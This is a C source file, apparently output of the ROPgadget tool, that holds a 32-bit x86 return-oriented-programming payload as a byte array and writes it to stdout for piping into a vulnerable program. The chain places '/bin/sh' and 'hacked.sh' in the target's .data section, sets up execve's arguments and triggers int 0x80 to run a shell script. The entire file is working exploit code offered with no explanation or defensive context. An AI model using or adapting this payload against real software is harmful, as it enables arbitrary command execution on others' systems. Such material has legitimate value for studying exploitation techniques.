/* execve generated by Ropgadget v4.0.1 */
#include <unistd.h>
unsigned char p[] = {

/* Padding goes here */

    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x60, 0xa0, 0x0e, 0x08, /* @ .data */
    0x96, 0x88, 0x0b, 0x08, /* pop eax ; ret */
    '/', 'b', 'i', 'n', /* /bin */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x64, 0xa0, 0x0e, 0x08, /* @ .data + 4 */
    0x96, 0x88, 0x0b, 0x08, /* pop eax ; ret */
    '/', 's', 'h', 'A', /* /shA */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x67, 0xa0, 0x0e, 0x08, /* @ .data + 7 */
    0xb3, 0x93, 0x04, 0x08, /* xor eax,eax ; ret */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x68, 0xa0, 0x0e, 0x08, /* @ .data + 8 */
    0x96, 0x88, 0x0b, 0x08, /* pop eax ; ret */
    'h', 'a', 'c', 'k', /* hack */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x6c, 0xa0, 0x0e, 0x08, /* @ .data + 12 */
    0x96, 0x88, 0x0b, 0x08, /* pop eax ; ret */
    'e', 'd', '.', 's', /* ed.s */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x70, 0xa0, 0x0e, 0x08, /* @ .data + 16 */
    0x96, 0x88, 0x0b, 0x08, /* pop eax ; ret */
    'h', 'A', 'A', 'A', /* hAAA */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x71, 0xa0, 0x0e, 0x08, /* @ .data + 17 */
    0xb3, 0x93, 0x04, 0x08, /* xor eax,eax ; ret */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x72, 0xa0, 0x0e, 0x08, /* @ .data + 18 */
    0x96, 0x88, 0x0b, 0x08, /* pop eax ; ret */
    0x60, 0xa0, 0x0e, 0x08, /* @ .data */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x76, 0xa0, 0x0e, 0x08, /* @ .data + 22 */
    0x96, 0x88, 0x0b, 0x08, /* pop eax ; ret */
    0x68, 0xa0, 0x0e, 0x08, /* @ .data + 8 */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x7a, 0xa0, 0x0e, 0x08, /* @ .data + 26 */
    0xb3, 0x93, 0x04, 0x08, /* xor eax,eax ; ret */
    0x3b, 0x48, 0x05, 0x08, /* mov DWORD PTR [edx],eax ; ret */
    0xc9, 0x81, 0x04, 0x08, /* pop ebx ; ret */
    0x60, 0xa0, 0x0e, 0x08, /* @ .data */
    0x99, 0xf0, 0x0d, 0x08, /* pop ecx ; ret */
    0x72, 0xa0, 0x0e, 0x08, /* @ .data + 18 */
    0x8b, 0xef, 0x06, 0x08, /* pop edx ; ret */
    0x7a, 0xa0, 0x0e, 0x08, /* @ .data + 26 */
    0xb3, 0x93, 0x04, 0x08, /* xor eax,eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0xa6, 0xa8, 0x07, 0x08, /* inc eax ; ret */
    0x85, 0xcb, 0x06, 0x08, /* int 0x80 */
};
int main(void) {
  write(STDOUT_FILENO, p, sizeof(p));
  return 0;
}
